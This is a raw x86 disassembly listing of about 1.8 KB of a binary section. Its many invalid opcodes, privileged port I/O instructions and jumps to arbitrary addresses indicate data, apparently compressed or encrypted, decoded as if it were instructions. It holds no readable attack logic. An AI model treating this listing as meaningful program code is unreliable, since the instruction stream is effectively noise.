  40e990:	xlat   BYTE PTR ds:[ebx]
  40e991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e992:	sbb    BYTE PTR [eax],ch
  40e994:	sbb    edx,DWORD PTR [ebp+0x3e211b00]
  40e99a:	mov    ds:0xcfa9ef02,eax
  40e99f:	(bad)  
  40e9a0:	mov    dh,0x70
  40e9a2:	pop    esi
  40e9a3:	cmp    dh,dh
  40e9a5:	mov    edi,0x84738ae
  40e9aa:	shl    DWORD PTR [esi-0x6b14ebb0],0xe5
  40e9b1:	daa    
  40e9b2:	in     al,0xa7
  40e9b4:	(bad)  [eax]
  40e9b6:	test   al,0x94
  40e9b8:	shl    BYTE PTR [ebp-0x36],0xcd
  40e9bc:	out    0xf1,al
  40e9be:	loopne 0x40ea2c
  40e9c0:	imul   esp,edi,0xffffffe7
  40e9c3:	loopne 0x40e975
  40e9c5:	jp     0x40ea34
  40e9c7:	lods   al,BYTE PTR ds:[esi]
  40e9c8:	and    eax,DWORD PTR [eax+0x51b8bff3]
  40e9ce:	(bad)  
  40e9cf:	push   ebx
  40e9d0:	out    dx,eax
  40e9d1:	dec    ebp
  40e9d2:	mov    edi,0xe9ca274c
  40e9d7:	mov    esi,0xae61729b
  40e9dc:	pop    es
  40e9dd:	std    
  40e9de:	cmp    BYTE PTR [ebx],ah
  40e9e0:	xadd   BYTE PTR ds:0x264e6394,ch
  40e9e7:	mov    ch,0x1c
  40e9e9:	arpl   bp,bx
  40e9eb:	test   BYTE PTR [esp+esi*8],ch
  40e9ee:	neg    DWORD PTR [ecx]
  40e9f0:	out    dx,al
  40e9f1:	stos   BYTE PTR es:[edi],al
  40e9f2:	clc    
  40e9f3:	out    0x3e,al
  40e9f5:	dec    esp
  40e9f6:	cld    
  40e9f7:	test   DWORD PTR [esi-0x14],0x24ce75e9
  40e9fe:	stos   DWORD PTR es:[edi],eax
  40e9ff:	outs   dx,DWORD PTR ds:[esi]
  40ea00:	repz jecxz 0x40ea6b
  40ea03:	lahf   
  40ea04:	mov    edx,0xf08757b8
  40ea09:	icebp  
  40ea0a:	iret   
  40ea0b:	and    al,0x44
  40ea0d:	add    esi,DWORD PTR [esi-0x4c4b1b03]
  40ea13:	test   al,0x96
  40ea15:	sub    DWORD PTR [edi-0x19c68b09],ebx
  40ea1b:	out    0x8c,al
  40ea1d:	dec    ecx
  40ea1e:	push   esp
  40ea1f:	or     BYTE PTR [ebp-0x7ff57ff8],0x5
  40ea26:	xor    al,0x8a
  40ea28:	adc    ebp,DWORD PTR [edi]
  40ea2a:	jecxz  0x40ea43
  40ea2c:	je     0x8d865162
  40ea32:	test   BYTE PTR [edx],al
  40ea34:	or     DWORD PTR [ebx],ecx
  40ea36:	mov    edi,0x900b8bf3
  40ea3b:	push   edi
  40ea3c:	cmp    eax,0xe333fe25
  40ea41:	jmp    0x5945:0x488e4fa1
  40ea48:	xor    esi,esp
  40ea4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea4b:	mov    ch,0xbc
  40ea4d:	or     eax,0xfe58dd7b
  40ea52:	and    dh,cl
  40ea54:	cli    
  40ea55:	mov    bh,0x6e
  40ea57:	xchg   esi,eax
  40ea58:	shl    BYTE PTR [esi],0xfa
  40ea5b:	int3   
  40ea5c:	out    0x6b,eax
  40ea5e:	mov    WORD PTR [ecx],?
  40ea60:	xor    dl,BYTE PTR ds:0x69024680
  40ea66:	add    eax,0xa610fea0
  40ea6b:	fisttp DWORD PTR [edx+0x32a2eb65]
  40ea71:	mov    cl,0xf4
  40ea73:	aaa    
  40ea74:	(bad)  
  40ea76:	dec    esi
  40ea77:	mov    edi,cs
  40ea79:	jmp    0x40ea8f
  40ea7b:	fcom   st(6)
  40ea7d:	repz fsubr DWORD PTR [ebx]
  40ea80:	cmp    BYTE PTR [ecx+0x22],dh
  40ea83:	and    bh,cl
  40ea85:	adc    eax,DWORD PTR [ecx]
  40ea87:	add    eax,0x49dc8ef
  40ea8c:	push   es
  40ea8d:	xchg   BYTE PTR [ecx+0x58],dl
  40ea90:	pop    ss
  40ea91:	(bad)  
  40ea92:	shl    DWORD PTR [ebx+0x25],1
  40ea95:	mov    ds:0xcc6e7348,al
  40ea9a:	inc    edi
  40ea9b:	into   
  40ea9c:	inc    edi
  40ea9d:	fidiv  DWORD PTR [ecx]
  40ea9f:	test   BYTE PTR [ecx-0x77],cl
  40eaa2:	jmp    FWORD PTR [edx-0x1b]
  40eaa5:	out    0xd6,eax
  40eaa7:	addr16 xor eax,esp
  40eaaa:	arpl   WORD PTR [ebx-0x30378962],dx
  40eab0:	sub    eax,0x42a65bc
  40eab5:	aaa    
  40eab6:	loop   0x40ea83
  40eab8:	jbe    0x40ea6d
  40eaba:	dec    esp
  40eabb:	test   edx,0x24268054
  40eac1:	mov    esi,0x5c02e532
  40eac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eac7:	rcr    bl,1
  40eac9:	mov    ds:0xdef1bcd4,al
  40eace:	pop    edi
  40eacf:	xchg   ecx,eax
  40ead0:	xchg   edi,eax
  40ead1:	test   BYTE PTR [ecx-0x1c171297],0x72
  40ead8:	(bad)  
  40ead9:	fld    TBYTE PTR [ebp+0x6b]
  40eadc:	or     esi,ecx
  40eade:	jmp    0x40eb23
  40eae0:	or     DWORD PTR [ecx],edi
  40eae2:	pop    ss
  40eae3:	add    bh,0x65
  40eae6:	jmp    0x40eafa
  40eae8:	fsub   DWORD PTR [ebx-0x5d]
  40eaeb:	add    ebp,DWORD PTR [eax+0x2e939ba9]
  40eaf1:	sahf   
  40eaf2:	dec    edx
  40eaf3:	xchg   esp,eax
  40eaf4:	adc    al,0xab
  40eaf6:	repz mov ds:0x2509df24,eax
  40eafc:	xor    eax,DWORD PTR [edx]
  40eafe:	shl    dh,0xbc
  40eb01:	jne    0x40eb33
  40eb03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb04:	lods   eax,DWORD PTR ds:[esi]
  40eb05:	add    ah,dh
  40eb07:	mov    ch,0x1e
  40eb09:	push   esp
  40eb0a:	push   es
  40eb0b:	outs   dx,DWORD PTR ds:[esi]
  40eb0c:	pop    esi
  40eb0d:	sub    al,BYTE PTR [ecx]
  40eb0f:	dec    esi
  40eb10:	repz push ds
  40eb12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb13:	xchg   edx,eax
  40eb14:	jo     0x40ea99
  40eb16:	jmp    DWORD PTR [esi]
  40eb18:	stc    
  40eb19:	out    0xe6,eax
  40eb1b:	and    dl,BYTE PTR [ebx-0x2b263003]
  40eb21:	and    al,0x68
  40eb23:	ja     0x40eb11
  40eb25:	shl    ebx,cl
  40eb27:	push   ecx
  40eb28:	cld    
  40eb29:	cmc    
  40eb2a:	jecxz  0x40eaae
  40eb2c:	jp     0x40eb4d
  40eb2e:	pcmpgtw mm4,QWORD PTR [ebx+0x31ca5a0]
  40eb35:	mov    DWORD PTR [ecx+0x1c],eax
  40eb38:	pop    ds
  40eb39:	sub    dl,BYTE PTR [esi-0x7c12e183]
  40eb3f:	arpl   WORD PTR [edx-0x1f],sp
  40eb42:	dec    ecx
  40eb43:	mov    BYTE PTR [edx],dh
  40eb45:	inc    ecx
  40eb46:	mov    BYTE PTR [esi+0x1],ch
  40eb49:	mov    DWORD PTR [ecx+0x2a],0xbf0aa51c
  40eb50:	cwde   
  40eb51:	outs   dx,BYTE PTR ds:[esi]
  40eb52:	add    ebx,DWORD PTR [edi]
  40eb54:	jmp    0x40eb9c
  40eb56:	clc    
  40eb57:	iret   
  40eb58:	nop
  40eb59:	jo     0x40ebaa
  40eb5b:	xlat   BYTE PTR ds:[ebx]
  40eb5c:	jl     0x40eb32
  40eb5e:	sahf   
  40eb5f:	out    dx,eax
  40eb60:	xchg   edi,eax
  40eb61:	or     al,al
  40eb63:	or     ebp,esp
  40eb65:	jmp    FWORD PTR [edi+0x45]
  40eb68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb69:	push   ecx
  40eb6a:	xor    al,0x7d
  40eb6c:	jg     0x40eb61
  40eb6e:	pop    esi
  40eb6f:	mov    bh,0x74
  40eb71:	sbb    al,dl
  40eb73:	aam    0xec
  40eb75:	jbe    0x40ebe3
  40eb77:	xor    esp,DWORD PTR [ebx-0x3ce1f87d]
  40eb7d:	fwait
  40eb7e:	idiv   DWORD PTR [ebp+0x45]
  40eb81:	mov    bl,BYTE PTR [ebp+0x70]
  40eb84:	mov    cl,0x32
  40eb86:	add    al,0x11
  40eb88:	sbb    BYTE PTR [edx+ecx*1],cl
  40eb8b:	add    edi,DWORD PTR [ecx-0xf8c2095]
  40eb91:	je     0x40ebcc
  40eb93:	pop    edi
  40eb94:	cld    
  40eb95:	fsubr  QWORD PTR [edi-0x6e04477d]
  40eb9b:	add    ah,ah
  40eb9d:	test   DWORD PTR [ebx-0x1c],ebx
  40eba0:	mov    al,ds:0x25f7fa0d
  40eba5:	out    dx,eax
  40eba6:	pop    edi
  40eba7:	test   al,ah
  40eba9:	jmp    0xfb472fb0
  40ebae:	xor    BYTE PTR [ebp+0x6a],dh
  40ebb1:	or     al,0xf9
  40ebb3:	jae    0x40eb40
  40ebb5:	in     eax,0x9e
  40ebb7:	mov    DWORD PTR [eax+0x2b],eax
  40ebba:	push   edi
  40ebbb:	in     eax,0x63
  40ebbd:	in     al,0xcc
  40ebbf:	xor    esp,eax
  40ebc1:	push   es
  40ebc2:	sub    dl,al
  40ebc4:	xor    ebx,edx
  40ebc6:	das    
  40ebc7:	xor    BYTE PTR [eax],bh
  40ebc9:	push   esp
  40ebca:	push   eax
  40ebcb:	mov    BYTE PTR [edi+0xca54dff],cl
  40ebd1:	push   0xd103b862
  40ebd6:	ret    0xa813
  40ebd9:	mov    ecx,0x4fcf0c6d
  40ebde:	cmp    BYTE PTR [edi+0x4],ah
  40ebe1:	cwde   
  40ebe2:	push   eax
  40ebe3:	pop    eax
  40ebe4:	ja     0x40ec3a
  40ebe6:	fistp  QWORD PTR [ebx-0x23267bf7]
  40ebec:	push   ss
  40ebed:	mov    ebx,0x59c1d13d
  40ebf2:	arpl   WORD PTR ds:[esi-0x60e9671],cx
  40ebf9:	stc    
  40ebfa:	or     eax,0x2de5b2ca
  40ebff:	(bad)  
  40ec00:	and    bh,BYTE PTR [edx+0x20]
  40ec03:	pmaxub mm0,QWORD PTR [ebx-0x5f]
  40ec07:	sbb    DWORD PTR [ecx-0x7564183d],esp
  40ec0d:	xchg   ecx,eax
  40ec0e:	push   ebp
  40ec0f:	out    0xc7,al
  40ec11:	pop    es
  40ec12:	(bad)  
  40ec13:	in     eax,dx
  40ec14:	adc    ebx,DWORD PTR [eax+0x3e230bac]
  40ec1a:	mov    al,0xb
  40ec1c:	xchg   ebp,eax
  40ec1d:	jg     0x40ec89
  40ec1f:	inc    edi
  40ec20:	addr16 xor al,0x82
  40ec23:	xchg   ecx,eax
  40ec24:	(bad)  
  40ec25:	cmp    eax,ebp
  40ec27:	jg     0x40ebcc
  40ec29:	inc    edi
  40ec2a:	ret    0xdaab
  40ec2d:	adc    eax,0xb9696eb8
  40ec32:	mov    al,0xbc
  40ec34:	mov    ch,0x9f
  40ec36:	and    bl,BYTE PTR ds:[ebx-0x55]
  40ec3a:	and    edx,DWORD PTR [ecx+0xebfc9d9]
  40ec40:	mov    eax,0x7fb37f5b
  40ec45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec46:	add    dh,BYTE PTR [ebx-0x23e46d6f]
  40ec4c:	xor    eax,0x320d4c15
  40ec51:	push   ecx
  40ec52:	sbb    DWORD PTR ds:0xa08ad456,0x9
  40ec59:	cdq    
  40ec5a:	call   0x5f4193b0
  40ec5f:	xchg   ecx,eax
  40ec60:	call   0xbef8:0x4a2db637
  40ec67:	push   esi
  40ec68:	pop    ebp
  40ec69:	cwde   
  40ec6a:	data16 mov bl,0xb9
  40ec6d:	enter  0x3e9,0x7f
  40ec71:	pop    edi
  40ec72:	inc    ecx
  40ec73:	in     eax,0xcf
  40ec75:	sub    BYTE PTR [edi+0x647f8c80],dh
  40ec7b:	stos   BYTE PTR es:[edi],al
  40ec7c:	push   eax
  40ec7d:	mov    ah,BYTE PTR [esi-0x18851350]
  40ec83:	nop
  40ec84:	push   edx
  40ec85:	dec    BYTE PTR [edx]
  40ec87:	sbb    eax,0xf24c70b0
  40ec8c:	int3   
  40ec8d:	mov    BYTE PTR [esp+ecx*4-0x3318d23c],bl
  40ec94:	daa    
  40ec95:	and    DWORD PTR [edi+0x74],edi
  40ec98:	pusha  
  40ec99:	dec    edi
  40ec9a:	push   edi
  40ec9b:	fiadd  DWORD PTR ds:0x33908fb0
  40eca1:	sub    eax,0x4dc6b9a1
  40eca6:	inc    ecx
  40eca7:	aaa    
  40eca8:	adc    DWORD PTR [eax-0x5095bee5],eax
  40ecae:	add    esi,DWORD PTR [edi]
  40ecb0:	stc    
  40ecb1:	test   al,0x51
  40ecb3:	jae    0x40ed34
  40ecb5:	rcl    DWORD PTR [ebx],1
  40ecb7:	pop    ss
  40ecb8:	and    edi,ecx
  40ecba:	retf   0xf238
  40ecbd:	push   es
  40ecbe:	push   cs
  40ecbf:	dec    edx
  40ecc0:	ret    0xb1d6
  40ecc3:	push   edi
  40ecc4:	sbb    eax,0xd732a561
  40ecc9:	cmc    
  40ecca:	sbb    al,0x29
  40eccc:	clc    
  40eccd:	ja     0x40ecfc
  40eccf:	sub    al,0xc5
  40ecd1:	sbb    ebp,0x31
  40ecd4:	int3   
  40ecd5:	iret   
  40ecd6:	call   0xfd08:0x728516c2
  40ecdd:	pop    ecx
  40ecde:	fadd   QWORD PTR [ebp+esi*2+0x3e00a934]
  40ece5:	xor    BYTE PTR [edi],ah
  40ece7:	push   edi
  40ece8:	sub    al,0xbf
  40ecea:	fisubr WORD PTR [ebx]
  40ecec:	inc    eax
  40eced:	push   edi
  40ecee:	popa   
  40ecef:	clc    
  40ecf0:	aam    0xa4
  40ecf2:	and    al,0xfe
  40ecf4:	mov    al,0xf1
  40ecf6:	cmp    edx,DWORD PTR [ebx]
  40ecf8:	lahf   
  40ecf9:	mov    eax,0x4d257918
  40ecfe:	or     BYTE PTR ds:0xd7e141eb,bl
  40ed04:	bswap  ebx
  40ed06:	popa   
  40ed07:	and    BYTE PTR [edx+0x4cc0eff9],bl
  40ed0d:	add    al,0x30
  40ed0f:	stos   DWORD PTR es:[edi],eax
  40ed10:	or     esi,DWORD PTR [eax]
  40ed12:	sbb    ecx,DWORD PTR [esi+esi*1+0x7d]
  40ed16:	pop    ecx
  40ed17:	ficom  WORD PTR [ebx+0x6b]
  40ed1a:	lahf   
  40ed1b:	inc    esp
  40ed1d:	aaa    
  40ed1e:	mov    al,0xe3
  40ed20:	ja     0x40ed19
  40ed22:	retf   
  40ed23:	inc    esi
  40ed24:	sahf   
  40ed25:	lea    edi,[edi]
  40ed27:	clc    
  40ed28:	(bad)  
  40ed2a:	jmp    edi
  40ed2c:	jg     0x40ecf3
  40ed2e:	cmp    al,0xa5
  40ed30:	mov    edx,ebp
  40ed32:	loop   0x40ed97
  40ed34:	call   0x7646f5fb
  40ed39:	mul    DWORD PTR [ebx-0x7]
  40ed3c:	jnp    0x40ed69
  40ed3e:	adc    BYTE PTR [esi],cl
  40ed40:	cmp    bl,BYTE PTR [edx-0x70afcf60]
  40ed46:	pushf  
  40ed47:	adc    ah,BYTE PTR [edi]
  40ed49:	dec    edi
  40ed4a:	mov    ecx,0x63047073
  40ed4f:	daa    
  40ed50:	inc    edx
  40ed51:	and    dh,ah
  40ed53:	repz mov esp,0x8b3252b5
  40ed59:	icebp  
  40ed5a:	jg     0x40ed4a
  40ed5c:	(bad)  
  40ed5d:	aas    
  40ed5e:	fucomip st,st(3)
  40ed60:	inc    eax
  40ed61:	shr    BYTE PTR [edx-0x9879acb],0xa9
  40ed68:	outs   dx,BYTE PTR ds:[esi]
  40ed69:	in     al,0x14
  40ed6b:	jp     0x40edbe
  40ed6d:	test   DWORD PTR [eax+0x2ff30d70],ebx
  40ed73:	sbb    ah,al
  40ed75:	in     al,0xa5
  40ed77:	mov    ch,0xf0
  40ed79:	int    0x9f
  40ed7b:	inc    esi
  40ed7c:	jbe    0x40ed49
  40ed7e:	xor    esp,edi
  40ed80:	(bad)  
  40ed82:	mov    cl,0x24
  40ed84:	ror    DWORD PTR [eax-0x56440185],0xe9
  40ed8b:	add    DWORD PTR [edi+0x2b],esi
  40ed8e:	aas    
  40ed8f:	sbb    ebp,DWORD PTR [ecx-0x2c87d19d]
  40ed95:	sub    BYTE PTR [ebx-0x1c],0x60
  40ed99:	jb     0x40ed9d
  40ed9b:	pop    edx
  40ed9c:	clc    
  40ed9d:	mov    ch,0xff
  40ed9f:	aaa    
  40eda0:	mov    dl,0xa8
  40eda2:	add    dh,BYTE PTR [edi]
  40eda4:	jg     0x40ed93
  40eda6:	xor    esp,DWORD PTR [edx]
  40eda8:	fsubr  DWORD PTR [ebp-0x41]
  40edab:	cld    
  40edac:	ds jl  0x40ed6e
  40edaf:	jmp    0xd5ef:0xd9d0f647
  40edb6:	mov    edi,0x54e4d7d7
  40edbb:	xchg   DWORD PTR [ebp-0x10],ebx
  40edbe:	stc    
  40edbf:	mov    bh,0xa1
  40edc1:	mov    dh,0x75
  40edc3:	adc    DWORD PTR [ebp+ecx*2-0x2703dce9],edi
  40edca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edcb:	lock jmp 0x6e8e:0xe0f1dbcf
  40edd3:	cmp    DWORD PTR [esi-0x35],0x33d0f26a
  40edda:	in     eax,dx
  40eddb:	lds    edi,FWORD PTR [ecx+0x1f]
  40edde:	popf   
  40eddf:	inc    esp
  40ede0:	pusha  
  40ede1:	pop    ecx
  40ede2:	push   cs
  40ede3:	es aaa 
  40ede5:	(bad)  
  40ede9:	pop    esi
  40edea:	mov    eax,0xcdf5a27a
  40edef:	in     al,0x26
  40edf1:	ins    BYTE PTR es:[edi],dx
  40edf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edf3:	(bad)  
  40edf4:	pop    esp
  40edf5:	push   0xbb716dc6
  40edfa:	and    DWORD PTR [edi],eax
  40edfc:	pusha  
  40edfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edfe:	inc    edx
  40edff:	rol    DWORD PTR [edx+0x30078e63],1
  40ee05:	adc    edi,DWORD PTR [ecx]
  40ee07:	push   0x5
  40ee09:	lock mov esp,DWORD PTR [esi+0x65]
  40ee0d:	in     eax,dx
  40ee0e:	shufps xmm6,XMMWORD PTR [ecx+0x1cd17d4c],0x9e
  40ee16:	adc    eax,0xe48535d0
  40ee1b:	dec    edx
  40ee1c:	lahf   
  40ee1d:	test   BYTE PTR [esi-0x2507ea48],dh
  40ee23:	imul   BYTE PTR [ecx]
  40ee25:	test   eax,0x7bff790d
  40ee2a:	push   ss
  40ee2b:	jecxz  0x40edf6
  40ee2d:	push   edi
  40ee2e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40ee30:	aam    0x15
  40ee32:	and    DWORD PTR [esi],edi
  40ee34:	cmovge esp,DWORD PTR [ebp-0x55]
  40ee38:	dec    edi
  40ee39:	inc    esp
  40ee3a:	jno    0x40ee29
  40ee3c:	xchg   BYTE PTR [edx],cl
  40ee3e:	mov    esp,0xd250607a
  40ee43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee44:	mov    ecx,0xa9b47436
  40ee49:	jg     0x40ee1a
  40ee4b:	mov    al,0x93
  40ee4d:	push   es
  40ee4e:	lods   al,BYTE PTR ds:[esi]
  40ee4f:	fisub  DWORD PTR [ebx+0x17300216]
  40ee55:	mov    edi,0x2e9b084d
  40ee5a:	sbb    DWORD PTR [ebx],0xf59b3c51
  40ee60:	ja     0x40eea5
  40ee62:	cmp    bl,dl
  40ee64:	cli    
  40ee65:	ja     0x40eee6
  40ee67:	sti    
  40ee68:	mov    al,ds:0x802a59ac
  40ee6d:	in     eax,dx
  40ee6e:	jg     0x40ee72
  40ee70:	sub    ah,bh
  40ee72:	xchg   ebp,eax
  40ee73:	dec    eax
  40ee74:	(bad)  
  40ee75:	daa    
  40ee76:	mov    ds:0x28a90339,eax
  40ee7b:	or     BYTE PTR [ebx],dl
  40ee7d:	fidiv  WORD PTR [edx-0x269dbdd9]
  40ee83:	mov    bh,0xa4
  40ee85:	fcomp  QWORD PTR [esi+eax*4]
  40ee88:	std    
  40ee89:	fs mov bh,0xac
  40ee8c:	sbb    ch,BYTE PTR [esi]
  40ee8e:	and    al,BYTE PTR [ebx]
  40ee90:	mov    ebp,0xd9ce404f
  40ee95:	sbb    al,0x4d
  40ee97:	pusha  
  40ee98:	xor    bh,al
  40ee9a:	xor    DWORD PTR ds:0xbc6472ab,0x18
  40eea1:	es das 
  40eea3:	dec    cl
  40eea5:	mov    ebx,0x14c73e5
  40eeaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeab:	or     ecx,esi
  40eead:	ret    
  40eeae:	jae    0x40ee8d
  40eeb0:	adc    al,0x80
  40eeb2:	ins    DWORD PTR es:[edi],dx
  40eeb3:	add    al,0x4d
  40eeb5:	jecxz  0x40eedd
  40eeb7:	or     al,al
  40eeb9:	pop    esi
  40eeba:	lock es ret 
  40eebd:	imul   esp,DWORD PTR [ebx],0xdd802a00
  40eec3:	scas   eax,DWORD PTR es:[edi]
  40eec4:	cld    
  40eec5:	retf   0xd611
  40eec8:	out    0x5,al
  40eeca:	stos   BYTE PTR es:[edi],al
  40eecb:	xchg   ebx,eax
  40eecc:	outs   dx,DWORD PTR ds:[esi]
  40eecd:	mov    eax,ds:0x98f9a6f1
  40eed2:	sbb    BYTE PTR [ebp-0x78adaedd],cl
  40eed8:	adc    ch,bh
  40eeda:	mov    dh,0xb4
  40eedc:	lock push edi
  40eede:	scas   al,BYTE PTR es:[edi]
  40eedf:	scas   eax,DWORD PTR es:[edi]
  40eee0:	inc    ecx
  40eee1:	jb     0x40eecd
  40eee3:	or     bh,BYTE PTR [ecx-0x44]
  40eee6:	in     eax,dx
  40eee7:	fwait
  40eee8:	scas   eax,DWORD PTR es:[edi]
  40eee9:	and    BYTE PTR [edx+0x24],dh
  40eeec:	sub    al,0xbc
  40eeee:	add    ebx,ebx
  40eef0:	pop    ebx
  40eef1:	das    
  40eef2:	ja     0x40ee7f
  40eef4:	loopne 0x40eea9
  40eef6:	xor    cl,dh
  40eef8:	fistp  WORD PTR [esi-0x69]
  40eefb:	xchg   ecx,esi
  40eefd:	test   eax,0x9576947e
  40ef02:	enter  0xde,0xfa
  40ef06:	je     0x40ef43
  40ef08:	jbe    0x818c4a7f
  40ef0e:	mov    al,0xdf
  40ef10:	dec    esp
  40ef11:	jle    0x40ef7c
  40ef13:	mov    eax,0xea032a25
  40ef18:	std    
  40ef19:	push   ecx
  40ef1a:	or     BYTE PTR [edi+0x344b3bc8],bh
  40ef20:	(bad)  [edx-0x40]
  40ef23:	inc    esp
  40ef24:	add    bh,BYTE PTR [edx+0x3725b6c3]
  40ef2a:	xor    eax,0x4c0489bf
  40ef2f:	(bad)  
  40ef31:	inc    esi
  40ef32:	or     eax,0x70b46c7a
  40ef37:	imul   ebx,DWORD PTR [edi],0xc337f790
  40ef3d:	cmp    DWORD PTR [edi],eax
  40ef3f:	scas   al,BYTE PTR es:[edi]
  40ef40:	inc    dh
  40ef42:	inc    ebp
  40ef43:	mov    BYTE PTR [esi-0x1b],bh
  40ef46:	retf   
  40ef47:	jmp    0xdc1b
  40ef4c:	arpl   WORD PTR [eax],bp
  40ef4e:	(bad)  
  40ef4f:	lahf   
  40ef50:	jle    0x40efa9
  40ef52:	inc    ecx
  40ef53:	stos   DWORD PTR es:[edi],eax
  40ef54:	pushf  
  40ef55:	push   edi
  40ef56:	mov    BYTE PTR [esi+0x779c01b9],dh
  40ef5c:	jecxz  0x40efab
  40ef5e:	lock pop esp
  40ef60:	jle    0x40ef67
  40ef62:	jl     0x40ef91
  40ef64:	or     eax,0xff8e04a2
  40ef69:	jecxz  0x40efa1
  40ef6b:	pushf  
  40ef6c:	int3   
  40ef6d:	retf   0xbf85
  40ef70:	cmp    bl,BYTE PTR [edi]
  40ef72:	pop    es
  40ef73:	repz mov esi,DWORD PTR [ecx-0x13]
  40ef77:	jnp    0x40efc0
  40ef79:	xor    DWORD PTR [ebx+eax*8+0x34],esi
  40ef7d:	repnz pop edx
  40ef7f:	and    ebp,ecx
  40ef81:	sbb    al,0xff
  40ef83:	push   cs
  40ef84:	fs ret 0x6d7f
  40ef88:	mov    ebp,0x32662b6c
  40ef8d:	clc    
  40ef8e:	jp     0x40efc1
  40ef90:	jmp    0x40efd0
  40ef92:	fmul   DWORD PTR [edx+0x5f]
  40ef95:	aas    
  40ef96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef97:	pop    edi
  40ef98:	aaa    
  40ef99:	out    dx,eax
  40ef9a:	ffree  st(6)
  40ef9c:	adc    al,cl
  40ef9e:	sbb    al,0x3f
  40efa0:	std    
  40efa1:	pop    ebx
  40efa2:	dec    ebp
  40efa3:	enter  0x8b74,0xc8
  40efa7:	add    esp,ebx
  40efa9:	shl    ah,1
  40efab:	clc    
  40efac:	lods   eax,DWORD PTR ds:[esi]
  40efad:	das    
  40efae:	ins    DWORD PTR es:[edi],dx
  40efaf:	enter  0x8ac1,0x47
  40efb3:	mov    ds:0x79f3b452,al
  40efb8:	in     eax,0xee
  40efba:	pop    esp
  40efbb:	cmp    DWORD PTR [ecx],edx
  40efbd:	into   
  40efbe:	clc    
  40efbf:	mov    esi,0x343cc135
  40efc4:	push   es
  40efc5:	sub    dl,BYTE PTR [ecx-0x3c155569]
  40efcb:	add    esp,DWORD PTR [ebx+0x79]
  40efce:	jl     0x40efec
  40efd0:	mov    edi,0xb160c78f
  40efd5:	sbb    dh,BYTE PTR fs:[edi]
  40efd8:	push   eax
  40efd9:	jno    0x40efe6
  40efdb:	xor    eax,0x324823eb
  40efe0:	sbb    dh,BYTE PTR [edi-0x4e39a86c]
  40efe6:	in     al,0xbf
  40efe8:	sbb    al,0x17
  40efea:	hlt    
  40efeb:	xor    BYTE PTR [edx],0xe
  40efee:	fmul   QWORD PTR [eax]
  40eff0:	jae    0x40f016
  40eff2:	cmc    
  40eff3:	popf   
  40eff4:	pop    edx
  40eff5:	adc    eax,ebp
  40eff7:	(bad)  
  40eff8:	fwait
  40eff9:	retf   0x1cc0
  40effc:	or     edx,DWORD PTR [ebx-0x2f]
  40efff:	jmp    0x14a4cafb
  40f004:	inc    eax
  40f005:	xor    BYTE PTR es:[edx+0x3fd2c015],0xac
  40f00d:	xchg   esi,eax
  40f00e:	not    DWORD PTR ds:0xdd1c733e
  40f014:	mov    cl,0x2a
  40f016:	test   eax,0x52c6c18d
  40f01b:	jns    0x40f031
  40f01d:	js     0x40f005
  40f01f:	(bad)  
  40f020:	xor    BYTE PTR [edi],dl
  40f022:	sub    BYTE PTR fs:[ebp+0x0],dh
  40f026:	or     al,0xb3
  40f028:	cmp    al,0xa9
  40f02a:	add    al,0x7e
  40f02c:	fnstenv ds:0xa14fc22d
  40f032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f033:	sbb    eax,eax
  40f035:	mov    al,0x1f
  40f037:	pop    ebx
  40f038:	jne    0x40efe4
  40f03a:	xor    al,0x1c
  40f03c:	adc    eax,0x4404d640
  40f041:	clc    
  40f042:	fstp   DWORD PTR [eax-0x38048fa5]
  40f048:	repnz nop
  40f04a:	cmc    
  40f04b:	fidiv  WORD PTR [edi-0x37]
  40f04e:	dec    DWORD PTR [ecx+eax*1-0x72]
  40f052:	sub    bh,al
  40f054:	mov    edi,0x90dc9905
  40f059:	mov    esi,0xa46e8b77
  40f05e:	sub    eax,DWORD PTR [edx]
  40f060:	push   ecx
  40f061:	add    DWORD PTR [edx+ebx*2-0x65],esi
  40f065:	or     DWORD PTR [edx+eax*1-0x30],0xd1bc7284
  40f06d:	add    eax,0x84fec688
  40f072:	sahf   
  40f073:	xlat   BYTE PTR ds:[ebx]
  40f074:	inc    edx
  40f075:	sub    BYTE PTR [esi+0x5e],bl
  40f078:	sub    al,BYTE PTR [edx]
  40f07a:	mov    edi,0x6979b7fb
  40f07f:	loope  0x40f0ef
  40f081:	pop    esi
  40f082:	cmp    DWORD PTR [esi-0x3f62e129],eax
  40f088:	push   ebp
  40f089:	fbstp  TBYTE PTR [ebx-0x4c]
  40f08c:	(bad)  
  40f08d:	push   esp
  40f08e:	jg     0x40f0bb
  40f090:	mov    ds:0xf578f97d,al
  40f095:	jmp    0x40f01e
  40f097:	(bad)  
  40f098:	fimul  DWORD PTR [ebx+0x21353fcf]
  40f09e:	or     dl,ah
  40f0a0:	mov    DWORD PTR [esi-0x71],esi
  40f0a3:	in     al,dx
  40f0a4:	(bad)  
  40f0a5:	arpl   WORD PTR [eax+eax*4],si
  40f0a8:	cs inc eax
  40f0aa:	push   0x4f271724
  40f0af:	jbe    0x40f051
  40f0b1:	stos   BYTE PTR es:[edi],al
  40f0b2:	aaa    
  40f0b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0b4:	pop    esi
  40f0b5:	or     esp,ecx
  40f0b7:	cli    
  40f0b8:	stos   DWORD PTR es:[edi],eax
  40f0b9:	push   ss
  40f0ba:	dec    eax
  40f0bb:	(bad)  
  40f0bc:	pusha  
  40f0bd:	int    0xa7
  40f0bf:	pop    ss
  40f0c0:	or     esp,edx
  40f0c2:	and    DWORD PTR [ecx],ecx
  40f0c4:	js     0x40f04c
  40f0c6:	and    al,0xa0
  40f0c8:	mov    edx,0xd98553c8
